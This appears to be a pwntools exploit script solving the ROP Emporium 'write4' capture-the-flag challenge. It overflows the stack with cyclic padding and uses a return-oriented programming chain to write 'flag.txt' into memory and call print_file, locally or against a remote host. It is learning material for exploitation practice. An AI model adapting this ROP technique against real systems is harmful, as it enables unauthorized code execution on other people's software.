from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./write4")


class ROP_Gadget:
    data = 0x00601028
    flag = b"flag.txt"
    print_file = 0x00400510
    mov = 0x00400628 # mov qword ptr [r14], r15; ret;
    pop_r14_r15 = 0x00400690
    pop_rdi = 0x00400693


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)

def solve():
    io = conn()

    padding = cyclic(40)
    input("PAUSE...")

    payload = [
        padding,
        ROP_Gadget.pop_r14_r15,
        ROP_Gadget.data,
        ROP_Gadget.flag,
        ROP_Gadget.mov,
        ROP_Gadget.pop_rdi,
        ROP_Gadget.data,
        ROP_Gadget.print_file
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()